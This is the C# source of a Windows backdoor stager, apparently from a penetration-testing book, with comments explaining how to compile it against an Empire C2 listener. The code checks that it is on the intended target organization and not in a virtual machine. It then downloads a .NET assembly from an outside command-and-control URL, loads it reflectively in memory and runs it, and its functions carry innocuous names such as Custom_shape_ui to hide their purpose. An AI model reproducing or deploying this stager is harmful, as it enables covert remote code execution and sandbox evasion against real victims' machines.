using System;
using System.Management;
using Microsoft.Win32;
using System.Net;
using System.Reflection;
using System.Threading;

/*
  To compile add the reference in Visual studio to C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
  Otherwise use csc.exe at http://bit.ly/3otOr4h with the command:
  c:\Microsoft.Net.Compilers.3.8.0\tools\csc.exe /reference:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /out:health-check.exe assembly_backdoor.cs
  
  Remember to change condition elements in Valid_Environment, Valid_Environment2 and Valid_launch methods to execute it your environment.
  Of course you need a working listener instance on your C2, Empire for instance.
  Full code detail available in How to Hack Like a Legend book.
  
  Sparc Flow
*/
namespace backdoor2
{
    class Program
    {
        static void Main(string[] args)
        {
            new Thread(() => {
                Thread.CurrentThread.IsBackground = true;
                Prepare_shape_ui();
            }).Start();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();

        }

        static private void Prepare_shape_ui() {
            if (Valid_environment2() && Valid_environment() && Valid_launch())
                Custom_shape_ui();
        }
        static private bool Valid_launch() {
            //Fetch a registry key value that would not exist on a normal system
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\UEV\\Agent");
            //If key "Version" is not found, return true and proceed with the backdoor
            if (key != null && key.GetValue("Version") == null) {
                return true;
            }
            return false;
        }

        static private bool Valid_environment()
        {

            string query = "SELECT * FROM Win32_OperatingSystem";
            var search = new ManagementObjectSearcher(query);
            foreach (ManagementObject obj in search.Get()) {
                var objectName = obj["Organization"];
                if (objectName == null) { continue; }

                string name = objectName.ToString().Trim().ToLower();
                if (name.StartsWith("gs") || name.StartsWith("g&s"))
                    return true;
            }

            return false;
        }
        static private bool Valid_environment2()
        {

            var query = "SELECT * FROM Win32_VideoController";
            var search = new ManagementObjectSearcher(query);

            foreach (ManagementObject obj in search.Get())
            {
                var objectName = obj["Name"];
                if (objectName == null) { continue; }
                string name = objectName.ToString().Trim().ToLower();

                //ualb is short for virtualbox and² mwa for vmware
                if (name.Contains("mwa") || name.Contains("ualb") || name.Contains("basic") || name.Contains("adapter"))
                    return false;
            }

            //If none of the above checks work, Valid_environment returns true
            return true;
        }

        static private void Custom_shape_ui()
        {

            //Array that will hold our assembly
            byte[] myDataBuffer = null;

            //Use the default proxy registered on the system
            System.Net.WebRequest.DefaultWebProxy.Credentials = System.Net.CredentialCache.DefaultNetworkCredentials;

            //classic webclient object to download data
            WebClient myWebClient = new WebClient();
            try {
                var url = "https://reporting.stratjumbo.co.au/health-check";
                myDataBuffer = myWebClient.DownloadData(url);
            }
            catch { }

            //If the download fails return 
            if (myDataBuffer == null) {
                Console.WriteLine("could not fetch program from listener");
                return;
            }
            //Reflectively load it in memory
            Assembly a = Assembly.Load(myDataBuffer);
            Type t = a.GetType("fud_stager.Program");
            MethodInfo staticMethodInfo = t.GetMethod("Main");

            staticMethodInfo.Invoke(null, null);

            //End of Custom_shape_ui() method
        }

    }
}
